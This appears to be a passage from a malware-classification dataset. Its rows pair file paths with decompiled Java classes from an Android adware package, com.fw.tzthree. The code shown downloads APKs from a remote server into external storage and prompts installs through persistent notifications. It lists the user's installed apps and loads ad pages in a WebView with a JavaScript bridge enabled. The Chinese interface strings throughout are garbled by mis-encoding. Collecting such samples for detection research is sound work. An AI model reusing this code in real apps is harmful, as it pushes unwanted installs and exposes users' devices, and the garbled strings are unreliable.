notification.setLatestEventInfo(applicationContext,adInfo.getAppName(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…"",activity);     if (bitmap != null) {       this.a.b.U=bitmap;       int a=com.fw.tzthree.d.n.a(this.a.b.getApplicationContext(),45.0f);       FwAdDetailActivity fwAdDetailActivity=this.a.b;       bitmap2=this.a.b.U;       fwAdDetailActivity.U=com.fw.tzthree.d.n.a(bitmap2,a,a);       Context applicationContext2=this.a.b.getApplicationContext();       notification6=this.a.b.T;       com.fw.tzthree.d.u.a(View.inflate(applicationContext2,notification6.contentView.getLayoutId(),null));       notification7=this.a.b.T;       RemoteViews remoteViews=notification7.contentView;       bitmap3=this.a.b.U;       remoteViews.setImageViewBitmap(R.id.icon,bitmap3);     }     notification2=this.a.b.T;     notification2.icon=R.drawable.stat_sys_download_done;     FwAdDetailActivity fwAdDetailActivity2=this.a.b;     adInfo2=this.a.b.Z;     AdSwitches a2=com.fw.tzthree.d.aa.a(fwAdDetailActivity2,adInfo2);     if (a2 == null || a2.getUninstallBar() == null || !a2.getUninstallBar().isOn()) {       notification3=this.a.b.T;       notification3.flags=16;     }  else {       notification5=this.a.b.T;       notification5.flags=32;     }     this.a.b.R=(NotificationManager)this.a.b.getSystemService(""notification"");     notificationManager=this.a.b.R;     adInfo3=this.a.b.Z;     int intValue=3038375 + adInfo3.getAdId().intValue();     i=this.a.b.aa;     int i2=intValue + (i * 1000);     notification4=this.a.b.T;     notificationManager.notify(i2,notification4);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\e.code","public class e implements View.OnClickListener {   final File a;   final FwAdDetailActivity b;   public e(  FwAdDetailActivity fwAdDetailActivity,  File file){     this.b=fwAdDetailActivity;     this.a=file;   }   @Override public void onClick(  View view){     Button button;     Button button2;     ProgressBar progressBar;     AdInfo adInfo;     int i;     List list;     List list2;     button=this.b.w;     button.setVisibility(8);     button2=this.b.x;     button2.setVisibility(8);     progressBar=this.b.A;     progressBar.setVisibility(0);     this.b.a(this.a);     FwAdDetailActivity fwAdDetailActivity=this.b;     adInfo=this.b.Z;     i=this.b.aa;     com.fw.tzthree.d.m.a(fwAdDetailActivity,adInfo,i,1);     list=this.b.P;     int size=list.size();     if (size == 1) {       return;     }     for (int i2=1; i2 < size; i2++) {       list2=this.b.P;       com.fw.tzthree.d.m.a(this.b,(AdInfo)list2.get(i2),5,3);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\f.code","public class f extends AsyncTask<Integer,Integer,List<AppWallAdInfo>> {   final FwAdDetailActivity a;   public f(  FwAdDetailActivity fwAdDetailActivity){     this.a=fwAdDetailActivity;   }   @Override public List<AppWallAdInfo> doInBackground(  Integer... numArr){     Context context;     int intValue=numArr[0].intValue();     AppWallBusiness a=AppWallBusiness.a();     context=this.a.Y;     return a.a(context,true,intValue);   }   @Override public void onPostExecute(  List<AppWallAdInfo> list){     RelativeLayout relativeLayout;     RelativeLayout relativeLayout2;     if (list == null || list.size() == 0) {       relativeLayout=this.a.f;       relativeLayout.removeAllViews();       this.a.i();     }  else {       relativeLayout2=this.a.f;       relativeLayout2.removeAllViews();       this.a.a((List<AppWallAdInfo>)list);     }     super.onPostExecute(list);   }   @Override protected void onPreExecute(){     this.a.h();     FwAppWallManager.init(this.a);     super.onPreExecute();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\FwAdDetailActivity.code","public class FwAdDetailActivity extends Activity {   private static Stack<Activity> O;   private ProgressBar A;   private String M;   private int Q;   private NotificationManager R;   private String S;   private Notification T;   private Bitmap U;   private boolean V;   private com.fw.tzthree.core.y<?> W;   private AdDetailActivity$DownloadProgressReceiver X;   private Context Y;   private AdInfo Z;   private LinearLayout a;   private int aa;   private String ab;   private LinearLayout b;   private RelativeLayout c;   private RelativeLayout d;   private RelativeLayout e;   private RelativeLayout f;   private RelativeLayout g;   private RelativeLayout h;   private TextView i;   private TextView j;   private TextView k;   private TextView l;   private TextView m;   private TextView n;   private TextView o;   private ImageButton p;   private SmartImageView q;   private ImageView r;   private ImageView s;   private HorizontalScrollView t;   private GridView u;   private ScrollView v;   private Button w;   private Button x;   private ListView y;   private l z;   private final int B=256;   private final int C=257;   private final int D=258;   private final int E=259;   private final int F=260;   private final int G=261;   private final int H=262;   private final int I=263;   private final int J=264;   private final int K=265;   private final int L=272;   private Drawable N=new ColorDrawable(Color.argb(30,0,0,0));   private List<AdInfo> P=new ArrayList();   public DownloadInfo a(  int i,  AdInfo adInfo,  int i2,  long j){     DownloadInfo downloadInfo=new DownloadInfo();     downloadInfo.setAdId(adInfo.getAdId());     downloadInfo.setCompleteTime(Long.valueOf(j));     downloadInfo.setAppName(adInfo.getAppName());     downloadInfo.setG2Switches(adInfo.getG2Switches());     downloadInfo.setG3Switches(adInfo.getG3Switches());     downloadInfo.setWifiSwitches(adInfo.getWifiSwitches());     downloadInfo.setIsInstalled(false);     downloadInfo.setIcon(adInfo.getIcon());     downloadInfo.setUrl(adInfo.getUrl());     downloadInfo.setDownloadType(Integer.valueOf(i));     downloadInfo.setAdType(Integer.valueOf(i2));     downloadInfo.setRecommend(adInfo.getRecommend());     downloadInfo.setPackageName(adInfo.getPackageName());     downloadInfo.setAppSize(adInfo.getAppSize());     return downloadInfo;   }   public DownloadSuccessInfo a(  DownloadInfo downloadInfo){     DownloadSuccessInfo downloadSuccessInfo=new DownloadSuccessInfo();     downloadSuccessInfo.setAdId(downloadInfo.getAdId());     downloadSuccessInfo.setCompleteTime(downloadInfo.getCompleteTime());     downloadSuccessInfo.setAppName(downloadInfo.getAppName());     downloadSuccessInfo.setG2Switches(downloadInfo.getG2Switches());     downloadSuccessInfo.setG3Switches(downloadInfo.getG3Switches());     downloadSuccessInfo.setWifiSwitches(downloadInfo.getWifiSwitches());     downloadSuccessInfo.setIcon(downloadInfo.getIcon());     downloadSuccessInfo.setUrl(downloadInfo.getUrl());     downloadSuccessInfo.setDownloadType(downloadInfo.getDownloadType());     downloadSuccessInfo.setAdType(downloadInfo.getAdType());     downloadSuccessInfo.setRecommend(downloadInfo.getRecommend());     downloadSuccessInfo.setPackageName(downloadInfo.getPackageName());     downloadSuccessInfo.setAppSize(downloadInfo.getAppSize());     return downloadSuccessInfo;   }   private void a(  AdInfo adInfo){     this.i.setText(adInfo.getAppName());     this.q.setImageUrl(this.M + adInfo.getIcon());     this.j.setText(adInfo.getRecommend());     this.k.setText(""ç‰ˆæœ¬ï¼š"" + adInfo.getAppVersion());     this.l.setText(""å¤§å°�ï¼š"" + adInfo.getAppSize());     this.n.setText(adInfo.getIntro());   }   public void a(  File file){     this.X=new AdDetailActivity$DownloadProgressReceiver(this,file);     IntentFilter intentFilter=new IntentFilter();     intentFilter.addAction(com.fw.tzthree.b.a.bj);     registerReceiver(this.X,intentFilter);   }   public void a(  List<AppWallAdInfo> list){     this.y=new ListView(this);     this.y.setLayoutParams(new RelativeLayout.LayoutParams(-1,-2));     j();     this.y.addFooterView(this.h);     this.y.setDescendantFocusability(393216);     ArrayList arrayList=new ArrayList();     for (    AppWallAdInfo appWallAdInfo : list) {       if (appWallAdInfo.getAdId().intValue() == this.Z.getAdId().intValue()) {         arrayList.add(appWallAdInfo);       }     }     list.removeAll(arrayList);     this.z=new l(this,list);     this.y.setAdapter((ListAdapter)this.z);     this.y.setOnItemClickListener(new h(this));     this.f.setLayoutParams(new LinearLayout.LayoutParams(-1,((list.size() > 4 ? 4 : list.size()) * com.fw.tzthree.d.n.a(this,60.0f)) + com.fw.tzthree.d.n.a(this,66.0f)));     this.f.addView(this.y);   }   private void b(){     this.d=new RelativeLayout(this);     this.d.setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));     this.d.setBackgroundColor(Color.rgb(242,242,242));     l();     d();     c();     this.d.addView(this.c);     this.d.addView(this.b);     this.d.addView(this.v);   }   private void c(){     this.v=new ScrollView(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-1);     layoutParams.addRule(3,260);     layoutParams.addRule(2,261);     this.v.setLayoutParams(layoutParams);     e();     this.v.addView(this.a);   }   private void d(){     this.b=new LinearLayout(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,com.fw.tzthree.d.n.a(this,58.0f));     layoutParams.addRule(12);     this.b.setLayoutParams(layoutParams);     this.b.setBackgroundColor(Color.rgb(102,102,102));     this.b.setId(261);     this.b.setOrientation(0);     this.w=new Button(this);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(0,com.fw.tzthree.d.n.a(this,42.0f),1.0f);     layoutParams2.leftMargin=com.fw.tzthree.d.n.a(this,16.0f);     layoutParams2.rightMargin=com.fw.tzthree.d.n.a(this,12.0f);     layoutParams2.gravity=16;     this.w.setLayoutParams(layoutParams2);     this.w.setTextSize(2,18.0f);     this.w.setTextColor(com.fw.tzthree.d.ac.a(-1,-7829368));     this.w.setBackgroundDrawable(com.fw.tzthree.d.ac.a(com.fw.tzthree.d.ac.a(Color.parseColor(""#4d2d17""),15,false),com.fw.tzthree.d.ac.a(Color.parseColor(""#e5a345""),15,false)));     this.x=new Button(this);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(0,com.fw.tzthree.d.n.a(this,42.0f),1.0f);     layoutParams3.rightMargin=com.fw.tzthree.d.n.a(this,16.0f);     layoutParams3.leftMargin=com.fw.tzthree.d.n.a(this,8.0f);     layoutParams3.gravity=16;     this.x.setLayoutParams(layoutParams3);     this.x.setText(""é«˜é€Ÿä¸‹è½½"");     this.x.setTextSize(2,18.0f);     this.x.setTextColor(com.fw.tzthree.d.ac.a(-1,-7829368));     this.x.setBackgroundDrawable(com.fw.tzthree.d.ac.a(com.fw.tzthree.d.ac.a(Color.parseColor(""#224d1f""),15,false),com.fw.tzthree.d.ac.a(Color.parseColor(""#53bd4c""),15,false)));     this.x.setVisibility(8);     this.A=new ProgressBar(this);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(0,com.fw.tzthree.d.n.a(this,20.0f),1.0f);     layoutParams4.leftMargin=com.fw.tzthree.d.n.a(this,8.0f);     layoutParams4.rightMargin=com.fw.tzthree.d.n.a(this,8.0f);     layoutParams4.gravity=16;     this.A.setLayoutParams(layoutParams4);     com.fw.tzthree.d.d.a(this.A,""mOnlyIndeterminate"",false);     this.A.setIndeterminate(false);     this.A.setProgressDrawable(com.fw.tzthree.d.ac.a(Color.parseColor(""#54bc4d"")));     this.A.setBackgroundDrawable(com.fw.tzthree.d.ac.a(-1,8,false));     this.A.setVisibility(8);     this.b.addView(this.w);     this.b.addView(this.x);     this.b.addView(this.A);     if (com.fw.tzthree.d.w.a(getApplicationContext(),this.Z.getPackageName())) {       this.w.setText(""æ‰“å¼€"");       this.w.setOnClickListener(new a(this));       return;     }     AdInfo adInfo=this.P.get(0);     this.S=this.W.getSetting(this,this.aa).getResourcesAddr();     String str=this.S + adInfo.getUrl();     File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + com.fw.tzthree.b.a.P+ File.separator+ this.aa);     if (!file.exists()) {       file.mkdirs();     }     File file2=new File(file,this.aa + str.substring(str.lastIndexOf(""/"") + 1));     if (!file2.exists()) {       this.w.setText(""ä¸‹è½½"");       this.w.setOnClickListener(new e(this,file2));     }  else     if (((float)file2.length()) >= Float.valueOf(this.Z.getAppSize().replace(""M"","""").trim()).floatValue() * 1024.0f * 1024.0f) {       this.w.setText(""å®‰è£…"");       this.w.setOnClickListener(new c(this,file2));     }  else {       this.w.setText(""ä¸‹è½½"");       a(file2);       this.w.setOnClickListener(new b(this));     }   }   private void e(){     this.a=new LinearLayout(this);     this.a.setOrientation(1);     this.a.setLayoutParams(new LinearLayout.LayoutParams(-1,-1));     k();     this.s=new ImageView(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,com.fw.tzthree.d.n.a(this,2.0f));     layoutParams.addRule(12);     this.s.setLayoutParams(layoutParams);     this.s.setBackgroundDrawable(new ColorDrawable(Color.rgb(204,204,204)));     this.t=new HorizontalScrollView(this);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-1,-2);     layoutParams2.topMargin=com.fw.tzthree.d.n.a(this,4.0f);     layoutParams2.bottomMargin=com.fw.tzthree.d.n.a(this,4.0f);     this.t.setLayoutParams(layoutParams2);     this.t.setVerticalScrollBarEnabled(false);     this.t.setHorizontalScrollBarEnabled(false);     LinearLayout linearLayout=new LinearLayout(this);     linearLayout.setOrientation(0);     this.u=new GridView(this);     String[] split=this.Z.getPrintscreen().split("","");     if (split != null && split.length != 0) {       int length=split.length;       this.u.setLayoutParams(new ViewGroup.LayoutParams(((com.fw.tzthree.d.n.a(this,147.0f) + com.fw.tzthree.d.n.a(this,10.0f)) * length) - com.fw.tzthree.d.n.a(this,10.0f),com.fw.tzthree.d.n.a(this,244.0f)));       this.u.setColumnWidth(com.fw.tzthree.d.n.a(this,147.0f));       this.u.setHorizontalSpacing(com.fw.tzthree.d.n.a(this,10.0f));       this.u.setStretchMode(0);       this.u.setNumColumns(length);       this.u.setSelector(new ColorDrawable(0));       this.u.setAdapter((ListAdapter)new o(this,Arrays.asList(split)));       linearLayout.addView(this.u);       this.t.addView(linearLayout);     }     this.m=new TextView(this);     this.m.setLayoutParams(new RelativeLayout.LayoutParams(-1,com.fw.tzthree.d.n.a(this,38.0f)));     this.m.setPadding(com.fw.tzthree.d.n.a(this,8.0f),0,0,0);     this.m.setGravity(16);     this.m.setText(""è¯¦æƒ…ä»‹ç»�ï¼š"");     this.m.setTextColor(Color.rgb(77,77,77));     this.m.setTextSize(2,18.0f);     this.m.setBackgroundDrawable(new ColorDrawable(Color.rgb(204,204,204)));     this.n=new TextView(this);     this.n.setLayoutParams(new RelativeLayout.LayoutParams(-1,-2));     this.n.setPadding(com.fw.tzthree.d.n.a(this,8.0f),com.fw.tzthree.d.n.a(this,8.0f),com.fw.tzthree.d.n.a(this,8.0f),com.fw.tzthree.d.n.a(this,8.0f));     this.n.setTextColor(Color.rgb(77,77,77));     this.n.setTextSize(2,16.0f);     this.o=new TextView(this);     this.o.setLayoutParams(new RelativeLayout.LayoutParams(-1,com.fw.tzthree.d.n.a(this,38.0f)));     this.o.setPadding(com.fw.tzthree.d.n.a(this,8.0f),0,0,0);     this.o.setGravity(16);     this.o.setText(""æ—¶ä¸‹æœ€ç�«çˆ†æµ�è¡Œï¼š"");     this.o.setTextColor(Color.rgb(77,77,77));     this.o.setTextSize(2,18.0f);     this.o.setBackgroundDrawable(new ColorDrawable(Color.rgb(204,204,204)));     this.e.addView(this.q);     this.e.addView(this.j);     this.e.addView(this.r);     this.e.addView(this.k);     this.e.addView(this.l);     this.e.addView(this.s);     this.a.addView(this.e);     this.a.addView(this.t);     this.a.addView(this.m);     this.a.addView(this.n);     this.a.addView(this.o);     f();     this.a.addView(this.f);   }   private void f(){     this.f=new RelativeLayout(this);     this.f.setLayoutParams(new RelativeLayout.LayoutParams(-1,com.fw.tzthree.d.n.a(this,100.0f)));   }   public void g(){     new f(this).execute(this.Z.getAdId());   }   public void h(){     TextView textView=new TextView(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.topMargin=com.fw.tzthree.d.n.a(this,10.0f);     layoutParams.addRule(14);     textView.setLayoutParams(layoutParams);     textView.setText(""æ­£åœ¨åŠ è½½"");     textView.setTextColor(Color.parseColor(""#999999""));     textView.setTextSize(2,18.0f);     textView.setId(272);     this.f.addView(textView);     ImageView imageView=new ImageView(this);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.topMargin=com.fw.tzthree.d.n.a(this,10.0f);     layoutParams2.addRule(14);     layoutParams2.addRule(3,272);     imageView.setLayoutParams(layoutParams2);     AnimationDrawable animationDrawable=new AnimationDrawable();     animationDrawable.addFrame(com.fw.tzthree.d.g.b(this,50,10,""by_rloding_1.png""),250);     animationDrawable.addFrame(com.fw.tzthree.d.g.b(this,50,10,""by_rloding_2.png""),250);     animationDrawable.addFrame(com.fw.tzthree.d.g.b(this,50,10,""by_rloding_3.png""),250);     animationDrawable.addFrame(com.fw.tzthree.d.g.b(this,50,10,""by_rloding_4.png""),250);     animationDrawable.setOneShot(false);     imageView.setImageDrawable(animationDrawable);     ((AnimationDrawable)imageView.getDrawable()).start();     this.f.addView(imageView);   }   public void i(){     RelativeLayout relativeLayout=new RelativeLayout(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-2);     layoutParams.topMargin=com.fw.tzthree.d.n.a(this,10.0f);     relativeLayout.setLayoutParams(layoutParams);     relativeLayout.setGravity(1);     ImageView imageView=new ImageView(this);     imageView.setLayoutParams(new RelativeLayout.LayoutParams(-2,-2));     imageView.setImageBitmap(com.fw.tzthree.d.g.a(this,50,50,""by_mark.png""));     imageView.setId(264);     relativeLayout.addView(imageView);     TextView textView=new TextView(this);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(1,264);     layoutParams2.leftMargin=com.fw.tzthree.d.n.a(this,50.0f);     textView.setLayoutParams(layoutParams2);     textView.setText(""åŠ è½½å¤±è´¥ï¼�"");     textView.setTextColor(Color.parseColor(""#999999""));     textView.setTextSize(2,18.0f);     textView.setId(265);     relativeLayout.addView(textView);     TextView textView2=new TextView(this);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.addRule(3,265);     layoutParams3.addRule(1,264);     layoutParams3.leftMargin=com.fw.tzthree.d.n.a(this,10.0f);     textView2.setLayoutParams(layoutParams3);     textView2.setText(""è¯·æ£€æŸ¥æ‚¨çš„ç½‘ç»œé…�ç½®"");     textView2.setTextColor(Color.parseColor(""#999999""));     textView2.setTextSize(2,18.0f);     relativeLayout.addView(textView2);     textView2.setOnClickListener(new g(this));     this.f.addView(relativeLayout);   }   private void j(){     this.h=new RelativeLayout(this);     this.h.setBackgroundDrawable(com.fw.tzthree.d.ac.a(-1,0,true));     this.h.setLayoutParams(new AbsListView.LayoutParams(-1,com.fw.tzthree.d.n.a(this,66.0f)));     ImageView imageView=new ImageView(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(15);     layoutParams.addRule(11);     imageView.setLayoutParams(layoutParams);     imageView.setPadding(0,0,com.fw.tzthree.d.n.a(this,10.0f),0);     imageView.setImageBitmap(com.fw.tzthree.d.g.a(this,50,50,""by_surprise.png""));     this.h.addView(imageView);     TextView textView=new TextView(this);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.leftMargin=com.fw.tzthree.d.n.a(this,30.0f);     layoutParams2.topMargin=com.fw.tzthree.d.n.a(this,3.0f);     textView.setLayoutParams(layoutParams2);     textView.setText(""å�‘çŽ°æ›´å¤šå¥½åº”ç”¨"");     textView.setTextColor(Color.parseColor(""#52be4a""));     textView.setTextSize(2,22.0f);     textView.setId(263);     this.h.addView(textView);     TextView textView2=new TextView(this);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.leftMargin=com.fw.tzthree.d.n.a(this,50.0f);     layoutParams3.addRule(3,263);     textView2.setLayoutParams(layoutParams3);     textView2.setText(""ç«‹å�³è¿›å…¥  >>"");     textView2.setTextColor(Color.parseColor(""#e6a443""));     textView2.setTextSize(2,20.0f);     this.h.addView(textView2);   }   private void k(){     this.e=new RelativeLayout(this);     this.e.setLayoutParams(new RelativeLayout.LayoutParams(-1,com.fw.tzthree.d.n.a(this,68.0f)));     this.q=new SmartImageView(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(this,46.6f),com.fw.tzthree.d.n.a(this,46.6f));     layoutParams.leftMargin=com.fw.tzthree.d.n.a(this,8.0f);     layoutParams.rightMargin=com.fw.tzthree.d.n.a(this,4.0f);     layoutParams.addRule(15);     this.q.setLayoutParams(layoutParams);     this.q.setId(256);     this.q.setImageDrawable(this.N);     this.r=new ImageView(this);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(this,46.6f),com.fw.tzthree.d.n.a(this,46.6f));     layoutParams2.addRule(11);     layoutParams2.addRule(15);     layoutParams2.rightMargin=com.fw.tzthree.d.n.a(this,8.0f);     this.r.setLayoutParams(layoutParams2);     this.r.setId(257);     this.r.setImageBitmap(com.fw.tzthree.d.g.a(this,50,50,""by_safety_certification.png""));     this.j=new TextView(this);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.addRule(6,256);     layoutParams3.addRule(1,256);     layoutParams3.addRule(0,257);     layoutParams3.setMargins(com.fw.tzthree.d.n.a(this,3.0f),com.fw.tzthree.d.n.a(this,4.0f),com.fw.tzthree.d.n.a(this,4.0f),0);     this.j.setLayoutParams(layoutParams3);     this.j.setTextSize(2,18.0f);     this.j.setTextColor(Color.rgb(78,78,78));     this.j.setSingleLine(true);     this.j.setEllipsize(TextUtils.TruncateAt.valueOf(""END""));     this.j.setId(258);     this.k=new TextView(this);     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2);     layoutParams4.addRule(1,256);     layoutParams4.addRule(3,258);     layoutParams4.leftMargin=com.fw.tzthree.d.n.a(this,3.0f);     this.k.setLayoutParams(layoutParams4);     this.k.setTextColor(Color.rgb(101,101,101));     this.k.setTextSize(2,12.0f);     this.k.setId(259);     this.l=new TextView(this);     RelativeLayout.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(-2,-2);     layoutParams5.addRule(1,259);     layoutParams5.addRule(3,258);     layoutParams5.leftMargin=com.fw.tzthree.d.n.a(this,14.0f);     this.l.setLayoutParams(layoutParams5);     this.l.setTextColor(Color.rgb(101,101,101));     this.l.setTextSize(2,12.0f);   }   private void l(){     this.c=new RelativeLayout(this);     this.c.setBackgroundColor(Color.rgb(83,189,76));     this.c.setLayoutParams(new RelativeLayout.LayoutParams(-1,com.fw.tzthree.d.n.a(getApplicationContext(),53.3f)));     this.c.setId(260);     this.i=new TextView(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(13);     this.i.setLayoutParams(layoutParams);     this.i.setTextSize(22.0f);     this.i.setSingleLine(true);     this.i.setEllipsize(TextUtils.TruncateAt.valueOf(""END""));     this.i.setTextColor(-1);     this.i.setTextSize(2,22.0f);     this.p=new ImageButton(this);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(this,50.3f),-1);     layoutParams2.addRule(15);     this.p.setLayoutParams(layoutParams2);     this.p.setImageBitmap(com.fw.tzthree.d.g.a(this,15,20,""back.png""));     this.p.setBackgroundColor(Color.alpha(0));     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed,R.attr.state_enabled},new ColorDrawable(Color.argb(50,0,0,0)));     this.p.setBackgroundDrawable(stateListDrawable);     this.p.setOnClickListener(new i(this));     this.c.addView(this.p);     this.c.addView(this.i);   }   public void a(  Activity activity){     if (O == null) {       O=new Stack<>();     }     O.add(activity);   }   @Override public void onBackPressed(){     if (O != null) {       O.clear();       O=null;     }     finish();     super.onBackPressed();   }   @Override @SuppressLint({""SetJavaScriptEnabled"",""JavascriptInterface""}) protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     Intent intent=getIntent();     this.Y=getApplicationContext();     this.Z=(AdInfo)intent.getSerializableExtra(com.fw.tzthree.b.a.aX);     this.aa=intent.getIntExtra(com.fw.tzthree.b.a.ba,1);     this.ab=intent.getStringExtra(com.fw.tzthree.b.a.bc);     this.Q=intent.getIntExtra(""FE553A86398017F74891B9CBB1EC1800"",0);     this.V=intent.getBooleanExtra(com.fw.tzthree.b.a.bh,false);     Setting setting=AppWallBusiness.a().getSetting(this,1);     if (setting == null) {       setting=AppWallBusiness.a().getSetting(this,5);     }     this.M=setting.getResourcesAddr();     this.P.add(this.Z);     com.fw.tzthree.core.y.getCommonBusiness(this,this.aa).postActionRequest(this,this.Z,4);     this.W=com.fw.tzthree.core.y.getCommonBusiness(getApplicationContext(),this.aa);     if (this.aa == 1) {       Intent intent2=new Intent(this,(Class<?>)FwAdDetailActivity.class);       intent2.putExtra(com.fw.tzthree.b.a.aX,this.Z);       intent.putExtra(com.fw.tzthree.b.a.ba,1);       intent.putExtra(com.fw.tzthree.b.a.aW,this.Z.getUrl());       com.fw.tzthree.d.u.a(this,this.aa,this.Z,3038375 + this.Z.getAdId().intValue() + 123,PendingIntent.getActivity(this,new Random().nextInt(AsyncHttpClient.DEFAULT_SOCKET_TIMEOUT),intent2,134217728),true);     }     a((Activity)this);     if (1 != this.Z.getKind().intValue()) {       if (2 == this.Z.getKind().intValue()) {         b();         setContentView(this.d);         a(this.Z);         return;       }  else {         if (3 == this.Z.getKind().intValue()) {           com.fw.tzthree.d.r.a(this,this.Z.getUrl());           finish();           return;         }         return;       }     }     String url=this.Z.getUrl();     LinearLayout linearLayout=new LinearLayout(this);     linearLayout.setOrientation(1);     linearLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     ProgressWebView progressWebView=new ProgressWebView(this);     progressWebView.setLayoutParams(new LinearLayout.LayoutParams(-1,-1,1.0f));     progressWebView.getSettings().setJavaScriptEnabled(true);     progressWebView.addJavascriptInterface(new JsInterface(this,this.Z,com.fw.tzthree.core.y.getCommonBusiness(getApplicationContext(),this.aa)),com.fw.tzthree.b.a.O);     progressWebView.loadUrl(url);     progressWebView.setWebViewClient(new q(this,null));     linearLayout.addView(progressWebView);     setContentView(linearLayout);   }   @Override protected void onDestroy(){     super.onDestroy();     if (this.X != null) {       unregisterReceiver(this.X);     }   }   @Override protected void onResume(){     super.onResume();     if (2 == this.Z.getKind().intValue()) {       g();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\FwBoxDActivity.code","public class FwBoxDActivity extends Activity implements AdapterView.OnItemClickListener {   private ah a;   private List<AppWallAdInfo> b;   private Animation c;   private RelativeLayout d;   private Handler e=new y(this);   private ag f;   public void a(  AppWallAdInfo appWallAdInfo){     Intent intent=new Intent(this,(Class<?>)FwWebActivity.class);     intent.putExtra(com.fw.tzthree.b.a.aX,appWallAdInfo);     intent.putExtra(com.fw.tzthree.b.a.ba,5);     intent.setFlags(268435456);     startActivity(intent);   }   private boolean a(  String str){     PackageManager packageManager=getPackageManager();     List<PackageInfo> installedPackages=packageManager.getInstalledPackages(8192);     ArrayList arrayList=new ArrayList();     for (    PackageInfo packageInfo : installedPackages) {       InstalledApp installedApp=new InstalledApp();       installedApp.setAppName(packageInfo.applicationInfo.loadLabel(packageManager).toString());       installedApp.setPackageName(packageInfo.packageName);       arrayList.add(installedApp);     }     Iterator it=arrayList.iterator();     while (it.hasNext()) {       if (((InstalledApp)it.next()).getPackageName().equals(str)) {         return true;       }     }     return false;   }   private void b(){     try {       FwBoxManager.init(this);     }  catch (    Exception e) {       e.printStackTrace();     }     BoxBusiness.b().a(this,this.e,new z(this),false);   }   private void b(  AppWallAdInfo appWallAdInfo){     BoxBusiness.b().postActionRequest(this,appWallAdInfo,4);   }   private void c(){     if (this.f == null) {       this.f=new ag(this);     }     IntentFilter intentFilter=new IntentFilter();     intentFilter.addAction(com.fw.tzthree.b.a.bj);     registerReceiver(this.f,intentFilter);   }   public void c(  AppWallAdInfo appWallAdInfo){     com.fw.tzthree.d.m.a(this,appWallAdInfo,5,1,false);   }   private void d(  AppWallAdInfo appWallAdInfo){     AlertDialog.Builder builder=new AlertDialog.Builder(this);     builder.setMessage(com.fw.tzthree.d.j.cc + appWallAdInfo.getAppName()).setCancelable(false).setPositiveButton(com.fw.tzthree.d.j.cb,new ad(this)).setNegativeButton(com.fw.tzthree.d.j.ca,new ac(this,appWallAdInfo));     builder.create().show();   }   private void e(  AppWallAdInfo appWallAdInfo){     AlertDialog.Builder builder=new AlertDialog.Builder(this);     builder.setMessage(com.fw.tzthree.d.j.cd + appWallAdInfo.getAppName() + com.fw.tzthree.d.j.ce).setCancelable(false).setPositiveButton(com.fw.tzthree.d.j.cb,new af(this)).setNegativeButton(com.fw.tzthree.d.j.ca,new ae(this,appWallAdInfo));     builder.create().show();   }   public void a(){     c();     RelativeLayout relativeLayout=new RelativeLayout(this);     relativeLayout.setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));     relativeLayout.setBackgroundColor(0);     this.d=new RelativeLayout(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-2);     layoutParams.addRule(14);     layoutParams.addRule(15);     layoutParams.setMargins(com.fw.tzthree.d.n.a(this,10.0f),com.fw.tzthree.d.n.a(this,10.0f),com.fw.tzthree.d.n.a(this,10.0f),com.fw.tzthree.d.n.a(this,10.0f));     this.d.setLayoutParams(layoutParams);     this.d.setPadding(0,com.fw.tzthree.d.n.a(this,10.0f),0,com.fw.tzthree.d.n.a(this,10.0f));     this.d.setBackgroundColor(Color.parseColor(""#cc000000""));     TextView textView=new TextView(this);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-2);     